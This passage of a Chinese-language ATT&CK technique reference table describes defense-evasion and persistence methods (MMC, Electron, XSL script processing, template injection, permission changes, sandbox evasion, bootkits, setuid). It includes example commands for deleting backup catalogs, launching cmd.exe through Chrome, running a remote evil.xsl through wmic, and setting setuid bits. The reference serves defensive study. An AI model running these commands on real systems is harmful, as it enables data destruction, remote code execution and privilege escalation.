| [T1218.014](../techniques/T1218.014.md) | MMC | 对手可能滥用mmc.exe代理执行恶意.msc文件。Microsoft管理控制台（MMC）是一个可能由Microsoft签名的二进制文件，可以在其GUI或命令提示符中以多种方式使用。(引用: win_mmc)(引用: what_is_mmc) MMC可用于创建、打开和保存包含Microsoft创建的管理工具的自定义控制台，称为管理单元。这些管理单元可用于本地或远程管理Windows系统。MMC还可用于打开Microsoft创建的.msc文件以管理系统配置。(引用: win_msc_files_overview)  例如，<code>mmc C:\Users\foo\admintools.msc /a</code>将以作者模式打开自定义保存的控制台msc文件。(引用: win_mmc) 另一个常见的例子是<code>mmc gpedit.msc</code>，它将打开组策略编辑器应用程序窗口。  对手可能使用MMC命令执行恶意任务。例如，<code>mmc wbadmin.msc delete catalog -quiet</code>在没有用户提示的情况下删除系统上的备份目录（即[抑制系统恢复](https://attack.mitre.org/techniques/T1490)）（注意：<code>wbadmin.msc</code>可能仅在默认情况下存在于Windows Server操作系统上）。(引用: win_wbadmin_delete_catalog)(引用: phobos_virustotal)  对手还可能滥用MMC执行恶意.msc文件。例如，对手可能首先创建一个恶意注册表类标识符（CLSID）子键，该子键唯一标识一个[组件对象模型](https://attack.mitre.org/techniques/T1559/001)类对象。(引用: win_clsid_key) 然后，对手可能创建带有“链接到Web地址”管理单元的自定义控制台，该管理单元链接到恶意CLSID子键。(引用: mmc_vulns) 一旦.msc文件保存，对手可能使用以下命令调用恶意CLSID负载：<code>mmc.exe -Embedding C:\path\to\test.msc</code>。(引用: abusing_com_reg) |
| [T1218.015](../techniques/T1218.015.md) | Electron应用程序 | 对手可能会滥用Electron框架的组件来执行恶意代码。Electron框架托管许多常见的应用程序，如Signal、Slack和Microsoft Teams。(引用: Electron 2) Electron最初由GitHub开发，是一个跨平台桌面应用程序开发框架，使用JavaScript、HTML和CSS等Web技术。(引用: Electron 3) Chromium引擎用于显示Web内容，Node.js运行后端代码。(引用: Electron 1)  由于Electron的功能机制（例如允许应用程序运行任意命令），对手也可能能够在后台执行恶意功能，可能伪装成框架内的合法工具。(引用: Electron 1) 例如，滥用`teams.exe`和`chrome.exe`可能允许对手作为合法应用程序的子进程执行恶意命令（例如，`chrome.exe --disable-gpu-sandbox --gpu-launcher="C:\Windows\system32\cmd.exe /c calc.exe"`）。(引用: Electron 6-8)  对手还可能通过在Electron应用程序中植入恶意[JavaScript](https://attack.mitre.org/techniques/T1059/007)来执行恶意内容。(引用: Electron Security) |
| [T1220](../techniques/T1220.md) | XSL脚本处理 | 攻击者可能通过在XSL文件中嵌入脚本来绕过应用程序控制并隐藏代码执行。可扩展样式表语言（XSL）文件通常用于描述XML文件中的数据处理和呈现。为了支持复杂操作，XSL标准包括对嵌入多种语言脚本的支持。（引用：Microsoft XSLT Script Mar 2017）  攻击者可能滥用此功能来执行任意文件，同时可能绕过应用程序控制。类似于[受信任的开发人员实用程序代理执行](https://attack.mitre.org/techniques/T1127)，Microsoft命令行转换实用程序二进制文件（msxsl.exe）（引用：Microsoft msxsl.exe）可以安装并用于执行嵌入在本地或远程（URL引用）XSL文件中的恶意JavaScript。（引用：Penetration Testing Lab MSXSL July 2017）由于msxsl.exe默认未安装，攻击者可能需要将其与丢弃的文件一起打包。（引用：Reaqta MSXSL Spearphishing MAR 2018）Msxsl.exe接受两个主要参数，一个XML源文件和一个XSL样式表。由于XSL文件是有效的XML，攻击者可能会两次调用相同的XSL文件。使用msxsl.exe时，攻击者还可能为XML/XSL文件指定任意文件扩展名。（引用：XSL Bypass Mar 2019）  命令行示例：（引用：Penetration Testing Lab MSXSL July 2017）（引用：XSL Bypass Mar 2019）  * <code>msxsl.exe customers[.]xml script[.]xsl</code> * <code>msxsl.exe script[.]xsl script[.]xsl</code> * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>  此技术的另一种变体称为“Squiblytwo”，涉及使用[Windows管理工具](https://attack.mitre.org/techniques/T1047)在XSL文件中调用JScript或VBScript。（引用：LOLBAS Wmic）此技术还可以执行本地/远程脚本，并且类似于其[Regsvr32](https://attack.mitre.org/techniques/T1218/010)/“Squiblydoo”对应物，利用受信任的内置Windows工具。攻击者可能滥用[Windows管理工具](https://attack.mitre.org/techniques/T1047)中的任何别名，只要他们使用/FORMAT开关。（引用：XSL Bypass Mar 2019）  命令行示例：（引用：XSL Bypass Mar 2019）（引用：LOLBAS Wmic）  * 本地文件：<code>wmic process list /FORMAT:evil[.]xsl</code> * 远程文件：<code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code> |
| [T1221](../techniques/T1221.md) | 模板注入 | 对手可能会创建或修改用户文档模板中的引用以隐藏恶意代码或强制身份验证尝试。例如，Microsoft的Office Open XML (OOXML)规范定义了一种基于XML的Office文档格式（.docx、.xlsx、.pptx）以取代旧的二进制格式（.doc、.xls、.ppt）。OOXML文件是由各种XML文件组成的ZIP归档文件，称为部分，包含定义文档如何呈现的属性。(引用: Microsoft Open XML July 2017)  部分中的属性可能引用通过在线URL访问的共享公共资源。例如，模板属性可能引用一个文件，作为预格式化的文档蓝图，在加载文档时获取。  对手可能会滥用这些模板来最初隐藏通过用户文档执行的恶意代码。注入文档的模板引用可能允许在加载文档时获取和执行恶意负载。(引用: SANS Brian Wiltse Template Injection) 这些文档可以通过其他技术如[网络钓鱼](https://attack.mitre.org/techniques/T1566)和/或[污染共享内容](https://attack.mitre.org/techniques/T1080)传递，并且可能会逃避静态检测，因为在获取恶意负载之前没有典型的指示器（VBA宏、脚本等）存在。(引用: Redxorblue Remote Template Injection) 在野外已经看到的示例中，模板注入被用来加载包含漏洞利用的恶意代码。(引用: MalwareBytes Template Injection OCT 2017)  对手还可能修改<code>*\template</code>控制字在.rtf文件中类似地隐藏然后下载恶意代码。这个合法的控制字值旨在成为模板文件资源的文件目标，在打开.rtf文件时检索和加载。然而，对手可能会更改现有.rtf文件的字节以插入模板控制字字段，包括恶意负载的URL资源。(引用: Proofpoint RTF Injection)(引用: Ciberseguridad Decoding malicious RTF files)  此技术还可能通过注入SMB/HTTPS（或其他凭证提示）URL并触发身份验证尝试来启用[强制身份验证](https://attack.mitre.org/techniques/T1187)。(引用: Anomali Template Injection MAR 2018)(引用: Talos Template Injection July 2017)(引用: ryhanson phishery SEPT 2016) |
| [T1222](../techniques/T1222.md) | 文件和目录权限修改 | 对手可能会修改文件或目录权限/属性，以规避访问控制列表 (ACL) 并访问受保护的文件。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) 文件和目录权限通常由文件或目录所有者或具有适当权限的用户通过 ACL 管理。文件和目录 ACL 实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。  修改可能包括更改特定的访问权限，这可能需要获取文件或目录的所有权和/或提升权限，具体取决于文件或目录的现有权限。这可能会启用恶意活动，例如修改、替换或删除特定文件或目录。特定文件和目录的修改可能是许多技术的必要步骤，例如通过[辅助功能](https://attack.mitre.org/techniques/T1546/008)、[启动或登录初始化脚本](https://attack.mitre.org/techniques/T1037)、[Unix Shell 配置修改](https://attack.mitre.org/techniques/T1546/004)建立持久性，或通过[劫持执行流](https://attack.mitre.org/techniques/T1574)污染/劫持其他重要的二进制/配置文件。  对手还可能更改符号链接的权限。例如，恶意软件（特别是勒索软件）可能会修改符号链接及其相关设置，以启用从具有远程路径的本地快捷方式访问文件。(引用: new_rust_based_ransomware)(引用: bad_luck_blackcat)(引用: falconoverwatch_blackcat_attack)(引用: blackmatter_blackcat)(引用: fsutil_behavior) |
| [T1222.001](../techniques/T1222.001.md) | Windows 文件和目录权限修改 | 对手可能会修改文件或目录权限/属性，以规避访问控制列表（ACL）并访问受保护的文件。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) 文件和目录权限通常由文件或目录所有者或具有适当权限的用户通过ACL进行管理。文件和目录ACL的实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。  Windows 通过自主访问控制列表（DACL）实现文件和目录ACL。(引用: Microsoft DACL May 2018) 类似于标准ACL，DACL标识允许或拒绝访问可保护对象的帐户。当尝试访问可保护对象时，系统按顺序检查DACL中的访问控制条目。如果找到匹配的条目，则授予对对象的访问权限。否则，访问被拒绝。(引用: Microsoft Access Control Lists May 2018)  对手可以使用内置的Windows命令与DACL进行交互，例如`icacls`、`cacls`、`takeown`和`attrib`，这些命令可以授予对特定文件和文件夹的更高权限。此外，[PowerShell](https://attack.mitre.org/techniques/T1059/001)提供了可以用来检索或修改文件和目录DACL的cmdlet。特定的文件和目录修改可能是许多技术的必要步骤，例如通过[辅助功能](https://attack.mitre.org/techniques/T1546/008)、[启动或登录初始化脚本](https://attack.mitre.org/techniques/T1037)建立持久性，或通过[劫持执行流](https://attack.mitre.org/techniques/T1574)污染/劫持其他重要的二进制文件/配置文件。 |
| [T1222.002](../techniques/T1222.002.md) | Linux 和 Mac 文件和目录权限修改 | 对手可能会修改文件或目录权限/属性，以规避访问控制列表（ACL）并访问受保护的文件。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) 文件和目录权限通常由文件或目录所有者或具有适当权限的用户管理。文件和目录 ACL 实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。  大多数 Linux 和基于 Linux 的平台提供一组标准的权限组（用户、组和其他）和一组标准的权限（读取、写入和执行），这些权限应用于每个组。虽然每个平台权限实现的细微差别可能有所不同，但大多数平台提供两个主要命令来操作文件和目录 ACL：<code>chown</code>（更改所有者的缩写）和<code>chmod</code>（更改模式的缩写）。  如果当前权限允许，对手可能会使用这些命令使自己成为文件和目录的所有者或更改模式。他们随后可以将其他人锁定在文件之外。特定的文件和目录修改可能是许多技术的必要步骤，例如通过[Unix Shell 配置修改](https://attack.mitre.org/techniques/T1546/004)建立持久性或通过[劫持执行流](https://attack.mitre.org/techniques/T1574)污染/劫持其他重要的二进制/配置文件。(引用: 20 macOS Common Tools and Techniques) |
| [T1480](../techniques/T1480.md) | 执行护栏 | 对手可能会使用执行护栏来根据对手提供的和目标环境中特定的条件来限制执行或操作。护栏确保有效载荷仅针对预期目标执行，并减少对手活动的附带损害。(引用: FireEye Kevin Mandia Guardrails) 对手可以提供的关于目标系统或环境的值以用作护栏可能包括特定的网络共享名称、连接的物理设备、文件、加入的 Active Directory (AD) 域和本地/外部 IP 地址。(引用: FireEye Outlook Dec 2019)  护栏可用于防止在不打算妥协或操作的环境中暴露能力。这种护栏的使用与典型的[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)不同。虽然[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)可能涉及检查已知的沙箱值并仅在没有匹配时继续执行，但护栏的使用将涉及检查预期的目标特定值，并仅在存在匹配时继续执行。  对手可能会识别并阻止某些用户代理以规避防御，并将攻击范围缩小到最有效的受害者和平台。用户代理自我标识数据，例如用户的软件应用程序、操作系统、供应商和版本。对手可能会检查用户代理以识别操作系统，然后仅为可利用的软件提供恶意软件，而忽略所有其他操作系统。(引用: Trellix-Qakbot) |
| [T1480.001](../techniques/T1480.001.md) | 环境密钥 | 攻击者可能通过环境密钥来约束恶意软件的执行或功能，以逃避防御并将执行限制在特定的目标环境中。环境密钥使用加密技术来约束执行或操作，基于攻击者提供的特定环境条件，这些条件预计会出现在目标环境中。环境密钥是[执行护栏](https://attack.mitre.org/techniques/T1480)的一种实现，利用加密技术从给定计算环境中的特定类型的值派生加密/解密密钥。(Citation: EK Clueless Agents)  可以从目标特定的元素派生值，并用于生成解密密钥以解密加密的负载。目标特定的值可以从特定的网络共享、物理设备、软件/软件版本、文件、加入的AD域、系统时间以及本地/外部IP地址派生。(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) 通过从目标特定的环境值生成解密密钥，环境密钥可以使沙箱检测、反病毒检测、信息众包和逆向工程变得困难。(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) 这些困难可能会减慢事件响应过程，并帮助攻击者隐藏其战术、技术和程序（TTP）。  类似于[混淆文件或信息](https://attack.mitre.org/techniques/T1027)，攻击者可能使用环境密钥来保护其TTP并逃避检测。环境密钥可用于向目标传递加密负载，该负载将使用目标特定的值在执行前解密负载。(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) 通过利用目标特定的值来解密负载，攻击者可以避免将解密密钥与负载打包或通过可能受监控的网络连接发送。根据收集目标特定值的技术，加密负载的逆向工程可能异常困难。(Citation: Kaspersky Gauss Whitepaper) 这可以用于防止在不打算被入侵或操作的环境中暴露能力。  与其他[执行护栏](https://attack.mitre.org/techniques/T1480)一样，环境密钥可用于防止在不打算被入侵或操作的环境中暴露能力。此活动与典型的[虚拟化/沙箱逃避](https://attack.mitre.org/techniques/T1497)不同。虽然使用[虚拟化/沙箱逃避](https://attack.mitre.org/techniques/T1497)可能涉及检查已知的沙箱值并在没有匹配的情况下继续执行，但使用环境密钥将涉及检查预期的目标特定值，该值必须匹配才能成功解密并随后执行。 |
| [T1480.002](../techniques/T1480.002.md) | 互斥 | 对手可能会根据与恶意软件相关的互斥体的存在来限制执行或操作。互斥体是一种用于同步访问资源的锁定机制。一次只能有一个线程或进程获取互斥体。(引用: Microsoft Mutexes)  虽然本地互斥体仅存在于给定进程内，允许多个线程同步访问资源，但系统互斥体可用于同步多个进程的活动。(引用: Microsoft Mutexes) 通过创建与特定恶意软件相关的唯一系统互斥体，对手可以验证系统是否已经被破坏。(引用: Sans Mutexes 2012)  在 Linux 环境中，恶意软件可能会尝试获取互斥文件上的锁定。如果恶意软件能够获取锁定，它将继续执行；如果失败，它将退出以避免创建自己的第二个实例。(引用: Intezer RedXOR 2021)(引用: Deep Instinct BPFDoor 2023)  互斥体名称可能是硬编码的，也可能使用可预测的算法动态生成。(引用: ICS Mutexes 2015) |
| [T1484](../techniques/T1484.md) | 域或租户策略修改 | 攻击者可能会修改域或身份租户的配置设置，以在集中管理环境中规避防御和/或提升权限。此类服务提供了集中管理身份资源（如设备和账户）的手段，通常包括适用于域或租户之间的配置设置，如信任关系、身份同步或身份联合。  对域或租户设置的修改可能包括更改Microsoft Active Directory (AD)中的域组策略对象（GPO）或更改域的信任设置，包括域或租户之间的联合信任关系。  拥有足够权限的攻击者可以修改域或租户策略设置。由于这些服务的配置设置适用于大量身份资源，因此滥用此功能可能导致大量潜在的攻击和恶意后果。此类滥用的示例包括：  * 修改GPO以将恶意[计划任务](https://attack.mitre.org/techniques/T1053/005)推送到整个域环境中的计算机（引用：ADSecurity GPO Persistence 2016）（引用：Wald0 Guide to GPOs）（引用：Harmj0y Abusing GPO Permissions） * 修改域信任以包含攻击者控制的域，允许攻击者伪造访问令牌，随后被受害域资源接受（引用：Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks） * 更改AD环境中的配置设置以实施[恶意域控制器](https://attack.mitre.org/techniques/T1207)。 * 向身份租户添加新的攻击者控制的联合身份提供者，允许攻击者以受害租户管理的任何用户身份进行身份验证（引用：Okta Cross-Tenant Impersonation 2023）  攻击者可能会临时修改域或租户策略，执行恶意操作，然后恢复更改以删除可疑迹象。 |
| [T1484.001](../techniques/T1484.001.md) | 组策略修改 | 对手可能会修改组策略对象 (GPO) 以颠覆域的预期自由访问控制，通常是为了在域上提升权限。组策略允许在 Active Directory (AD) 中集中管理用户和计算机设置。GPO 是包含组策略设置的容器，由存储在可预测网络路径 `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\` 中的文件组成。(引用: TechNet Group Policy Basics)(引用: ADSecurity GPO Persistence 2016)  与 AD 中的其他对象一样，GPO 具有与之关联的访问控制。默认情况下，域中的所有用户帐户都有读取 GPO 的权限。可以将 GPO 访问控制权限（例如写入访问权限）委派给域中的特定用户或组。  恶意 GPO 修改可用于实现许多其他恶意行为，例如[计划任务/作业](https://attack.mitre.org/techniques/T1053)、[禁用或修改工具](https://attack.mitre.org/techniques/T1562/001)、[入口工具传输](https://attack.mitre.org/techniques/T1105)、[创建账户](https://attack.mitre.org/techniques/T1136)、[服务执行](https://attack.mitre.org/techniques/T1569/002)等。(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)(引用: Mandiant M Trends 2016)(引用: Microsoft Hacking Team Breach) 由于 GPO 可以控制 AD 环境中的许多用户和计算机设置，因此可能会出现大量潜在攻击。(引用: Wald0 Guide to GPOs)  例如，可以利用公开可用的脚本（如 <code>New-GPOImmediateTask</code>）通过修改 GPO 设置自动创建恶意[计划任务/作业](https://attack.mitre.org/techniques/T1053)，在这种情况下，修改 <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>。(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions) 在某些情况下，对手可能会修改特定用户权限，如 SeEnableDelegationPrivilege，设置在 <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code> 中，以实现对域的完全控制，因为对手控制的用户帐户将能够修改 GPO。(引用: Harmj0y SeEnableDelegationPrivilege Right) |
| [T1484.002](../techniques/T1484.002.md) | 信任修改 | 对手可能会添加新的域信任，修改现有域信任的属性，或以其他方式更改域和租户之间的信任关系配置，以规避防御和/或提升权限。信任详细信息，例如用户身份是否联合，允许身份验证和授权属性在域或租户之间应用，以访问共享资源。(引用: Microsoft - Azure AD Federation) 这些信任对象可能包括应用于服务器、令牌和域的帐户、凭据和其他身份验证材料。  操纵这些信任可能允许对手通过修改设置以添加他们控制的对象来提升权限和/或规避防御。例如，在 Microsoft Active Directory (AD) 环境中，这可以用来伪造[SAML 令牌](https://attack.mitre.org/techniques/T1606/002)，而无需破坏签名证书来伪造新凭据。相反，对手可以操纵域信任以添加自己的签名证书。对手还可以使用 Active Directory 联合服务 (AD FS) 将 AD 域转换为联合域，这可能使恶意信任修改成为可能，例如更改声明发布规则，以指定用户身份登录任何有效的凭据集。(引用: AADInternals zure AD Federated Domain)  对手还可以向身份租户（如 Okta 或 AWS IAM 身份中心）添加新的联合身份提供者，这可能使对手能够以租户的任何用户身份进行身份验证。(引用: Okta Cross-Tenant Impersonation 2023) 这可能使威胁行为者能够广泛访问利用身份租户的各种基于云的服务。例如，在 AWS 环境中，创建新身份提供者的对手将能够联合到所有 AWS 组织成员帐户，而无需为每个成员帐户创建身份。(引用: AWS RE:Inforce Threat Detection 2024) |
| [T1497](../techniques/T1497.md) | 虚拟化/沙箱规避 | 对手可能会采用各种方法检测和规避虚拟化和分析环境。这可能包括根据检查是否存在虚拟机环境 (VME) 或沙箱的工件的结果更改行为。如果对手检测到 VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放二级或其他有效载荷之前搜索 VME 工件。对手可能会在自动化发现期间使用从[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)中学到的信息来塑造后续行为。(引用: Deloitte Environment Awareness)  对手可能会使用几种方法来实现[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)，例如检查安全监控工具（例如 Sysinternals、Wireshark 等）或与分析或虚拟化相关的其他系统工件。对手还可能检查合法用户活动以帮助确定是否在分析环境中。其他方法包括在恶意软件代码中使用睡眠计时器或循环以避免在临时沙箱中运行。(引用: Unit 42 Pirpi July 2015) |
| [T1497.001](../techniques/T1497.001.md) | 系统检查 | 对手可能会进行各种系统检查，以检测和避免虚拟化和分析环境。这可能包括根据检查虚拟机环境（VME）或沙箱指示的工件的结果更改行为。如果对手检测到VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放二级或额外有效负载之前搜索VME工件。对手可能会利用从[虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497)中学到的信息，在自动发现期间塑造后续行为。(引用: Deloitte Environment Awareness)  具体检查将根据目标和/或对手而有所不同，但可能涉及使用[Windows管理规范](https://attack.mitre.org/techniques/T1047)、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、[系统信息发现](https://attack.mitre.org/techniques/T1082)和[查询注册表](https://attack.mitre.org/techniques/T1012)等行为来获取系统信息并搜索VME工件。对手可能会在内存、进程、文件系统、硬件和/或注册表中搜索VME工件。对手可能会使用脚本将这些检查自动化到一个脚本中，然后如果确定系统是虚拟环境，则让程序退出。  检查可能包括通用系统属性，例如主机/域名和网络流量样本。对手还可能检查网络适配器地址、CPU核心数和可用内存/驱动器大小。一旦执行，恶意软件还可能使用[文件和目录发现](https://attack.mitre.org/techniques/T1083)来检查它是否保存在具有意外或甚至与分析相关的命名工件（例如`malware`、`sample`或`hash`）的文件夹或文件中。  其他常见检查可能枚举这些应用程序独有的运行服务、系统上安装的程序、虚拟机应用程序的制造商/产品字段字符串以及VME特定的硬件/处理器指令。(引用: McAfee Virtual Jan 2017) 在VMWare等应用程序中，对手还可以使用特殊的I/O端口发送命令并接收输出。  硬件检查，例如风扇、温度和音频设备的存在，也可以用来收集可能表明虚拟环境的证据。对手还可能查询这些设备的特定读数。(引用: Unit 42 OilRig Sept 2018) |
| [T1497.002](../techniques/T1497.002.md) | 基于用户活动的检查 | 对手可能会采用各种用户活动检查来检测和规避虚拟化和分析环境。这可能包括根据检查是否存在虚拟机环境 (VME) 或沙箱的工件的结果更改行为。如果对手检测到 VME，他们可能会更改其恶意软件以脱离受害者或隐藏植入物的核心功能。他们还可能在投放二级或其他有效负载之前搜索 VME 工件。对手可能会在自动化发现期间使用从 [虚拟化/沙箱规避](https://attack.mitre.org/techniques/T1497) 中学到的信息来塑造后续行为。(引用: Deloitte Environment Awareness)  对手可能会根据鼠标移动和点击的速度/频率（引用: Sans Virtual Jan 2016）、浏览器历史记录、缓存、书签或常见目录（如主目录或桌面）中的文件数量来搜索主机上的用户活动。其他方法可能依赖于在恶意代码激活之前与系统的特定用户交互，例如等待文档关闭后激活宏（引用: Unit 42 Sofacy Nov 2018）或等待用户双击嵌入的图像以激活。(引用: FireEye FIN7 April 2017) |
| [T1497.003](../techniques/T1497.003.md) | 基于时间的规避 | 对手可能会采用各种基于时间的方法来检测和规避虚拟化和分析环境。这可能包括枚举基于时间的属性，例如正常运行时间或系统时钟，以及使用计时器或其他触发器来规避虚拟机环境 (VME) 或沙箱，特别是那些自动化或仅运行有限时间的环境。  对手可能会采用各种基于时间的规避方法，例如使用编程睡眠命令或本机系统调度功能（例如[计划任务/作业](https://attack.mitre.org/techniques/T1053)）在初始执行时延迟恶意软件功能。延迟还可能基于等待特定受害者条件满足（例如系统时间、事件等）或采用计划的[多阶段通道](https://attack.mitre.org/techniques/T1104)以避免分析和审查。(引用: Deloitte Environment Awareness)  还可以使用良性命令或其他操作来延迟恶意软件执行。循环或其他不必要的命令重复，例如[Ping](https://attack.mitre.org/software/S0097)，可能用于延迟恶意软件执行，并可能超过自动化分析环境的时间阈值。(引用: Revil Independence Day)(引用: Netskope Nitol) 另一种变体，通常称为 API 锤击，涉及对[本机 API](https://attack.mitre.org/techniques/T1106)函数进行各种调用，以延迟执行（同时也可能通过垃圾数据过载分析环境）。(引用: Joe Sec Nymaim)(引用: Joe Sec Trickbot)  对手还可能使用时间作为检测沙箱和分析环境的指标，特别是那些试图操纵时间机制以模拟更长时间的环境。例如，对手可能能够通过在执行睡眠函数之前和之后采样和计算环境时间戳的预期值来识别加速时间的沙箱。(引用: ISACA Malware Tricks) |
| [T1535](../techniques/T1535.md) | 未使用/不支持的云区域 | 对手可能会在未使用的地理服务区域中创建云实例，以逃避检测。通常通过破坏用于管理云基础设施的帐户获得访问权限。  云服务提供商通常在全球范围内提供基础设施，以提高性能、提供冗余并允许客户满足合规要求。通常，客户只会使用可用区域的子集，并且可能不会主动监控其他区域。如果对手在未使用的区域中创建资源，他们可能能够在不被发现的情况下操作。  这种行为的一个变体利用了云区域之间功能的差异。对手可以利用不支持高级检测服务的区域，以避免检测其活动。  对手使用未使用的AWS区域的一个例子是通过[资源劫持](https://attack.mitre.org/techniques/T1496)挖掘加密货币，这可能会随着时间的推移根据使用的处理能力花费组织大量资金。(引用: CloudSploit - Unused AWS Regions) |
| [T1542](../techniques/T1542.md) | 操作系统启动前 | 对手可能会滥用操作系统启动前的机制，作为在系统上建立持久性的一种方式。在计算机的启动过程中，固件和各种启动服务在操作系统加载之前加载。这些程序在操作系统接管之前控制执行流程。(引用: Wikipedia Booting)  对手可能会覆盖启动驱动程序或固件（如 BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI））中的数据，以在操作系统下的层面上持久存在于系统上。这可能特别难以检测，因为此级别的恶意软件不会被主机软件防御检测到。 |
| [T1542.001](../techniques/T1542.001.md) | 系统固件 | 对手可能会修改系统固件以在系统上保持持久性。BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI）或可扩展固件接口（EFI）是系统固件的示例，它们作为计算机操作系统和硬件之间的软件接口。(引用: Wikipedia BIOS)(引用: Wikipedia UEFI)(引用: About UEFI)  系统固件如 BIOS 和 (U)EFI 支持计算机的功能，可能会被对手修改以执行或协助恶意活动。存在覆盖系统固件的能力，这可能为复杂的对手提供一种手段，通过安装恶意固件更新作为在系统上保持持久性的一种手段，这可能难以检测。 |
| [T1542.002](../techniques/T1542.002.md) | 组件固件 | 对手可能会修改组件固件以在系统上持久存在。一些对手可能会采用复杂的方法来破坏计算机组件并安装恶意固件，该固件将在操作系统和主系统固件或 BIOS 之外执行对手代码。这种技术可能类似于[系统固件](https://attack.mitre.org/techniques/T1542/001)，但在其他系统组件/设备上进行，这些组件/设备可能没有相同的能力或完整性检查级别。  恶意组件固件可以在尽管潜在的典型故障无法维持访问和硬盘重新映像的情况下提供对系统的持久访问级别，以及一种绕过主机软件防御和完整性检查的方法。 |
| [T1542.003](../techniques/T1542.003.md) | 引导工具包 | 对手可能会使用引导工具包在系统上保持持久性。引导工具包位于操作系统下方的层，可能使执行完全修复变得困难，除非组织怀疑使用了引导工具包并能相应地采取行动。  引导工具包是一种修改硬盘引导扇区的恶意软件变体，包括主引导记录 (MBR) 和卷引导记录 (VBR)。(引用: Mandiant M Trends 2016) MBR 是在 BIOS 完成硬件初始化后首先加载的磁盘部分。它是引导加载程序的位置。具有对引导驱动器的原始访问权限的对手可能会覆盖此区域，在启动过程中将执行从正常引导加载程序转移到对手代码。(引用: Lau 2011)  MBR 将引导过程的控制权交给 VBR。与 MBR 的情况类似，具有对引导驱动器的原始访问权限的对手可能会覆盖 VBR，在启动过程中将执行转移到对手代码。 |
| [T1542.004](../techniques/T1542.004.md) | ROMMONkit | 对手可能通过加载包含对手代码的未经授权的固件来滥用ROM Monitor（ROMMON），以提供持久访问并操纵设备行为，这很难检测到。(引用: Cisco Synful Knock Evolution)(引用: Cisco Blog Legacy Device Attacks)   ROMMON是Cisco网络设备固件，作为引导加载程序、引导映像或引导助手在平台上电或重置时初始化硬件和软件。类似于[TFTP引导](https://attack.mitre.org/techniques/T1542/005)，对手可能通过本地或远程（例如，通过TFTP）升级ROMMON映像，包含对手代码并重新启动设备，以覆盖现有的ROMMON映像。这为对手提供了一种方式，通过更新ROMMON在系统上获得持久性，这可能很难检测到。 |
| [T1542.005](../techniques/T1542.005.md) | TFTP 启动 | 对手可能会滥用网络启动从简单文件传输协议 (TFTP) 服务器加载未经授权的网络设备操作系统。TFTP 启动（网络启动）通常由网络管理员用于从集中管理服务器加载配置控制的网络设备映像。网络启动是引导顺序中的一个选项，可用于集中管理和控制设备映像。  对手可能会操纵网络设备上的配置，指定使用恶意 TFTP 服务器，这可能与[修改系统映像](https://attack.mitre.org/techniques/T1601)结合使用，以在设备启动或重置时加载修改后的映像。未经授权的映像允许对手修改设备配置，向设备添加恶意功能，并引入后门以保持对网络设备的控制，同时通过使用标准功能最小化检测。这种技术类似于[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)，可能导致网络设备运行修改后的映像。(引用: Cisco Blog Legacy Device Attacks) |
| [T1548](../techniques/T1548.md) | 滥用提升控制机制 | 对手可能会绕过旨在控制提升权限的机制，以获得更高级别的权限。大多数现代系统包含本机提升控制机制，旨在限制用户在计算机上执行的权限。必须授权特定用户才能执行被认为具有较高风险的任务。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 对手可以通过多种方法利用内置控制机制，以在系统上提升权限。(引用: OSX Keydnap malware)(引用: Fortinet Fareit) |
| [T1548.001](../techniques/T1548.001.md) | Setuid 和 Setgid | 对手可能会滥用配置，其中应用程序设置了 setuid 或 setgid 位，以便在不同（可能更高级别）用户的上下文中运行代码。在 Linux 或 macOS 上，当为应用程序二进制文件设置 setuid 或 setgid 位时，应用程序将以拥有用户或组的权限运行。(引用: setuid man page) 通常，应用程序在当前用户的上下文中运行，无论哪个用户或组拥有应用程序。然而，在某些情况下，程序需要在提升的上下文中执行才能正常运行，但运行它们的用户可能没有特定的所需权限。  与在 sudoers 文件中创建条目不同，这必须由 root 完成，任何用户都可以指定为自己的应用程序设置 setuid 或 setgid 标志（即[Linux 和 Mac 文件和目录权限修改](https://attack.mitre.org/techniques/T1222/002)）。可以使用位掩码通过 <code>chmod</code> 命令设置这些位，<code>chmod 4777 [file]</code> 或通过简写命名，<code>chmod u+s [file]</code>。这将启用 setuid 位。要启用 setgid 位，可以使用 <code>chmod 2775</code> 和 <code>chmod g+s</code>。  对手可以在自己的恶意软件上使用此机制，以确保他们能够在未来的提升上下文中执行。(引用: OSX Keydnap malware) 这种滥用通常是“shell 逃逸”或其他绕过具有受限权限的执行环境的操作的一部分。  或者，对手可能会选择查找和目标具有已启用 setuid 或 setgid 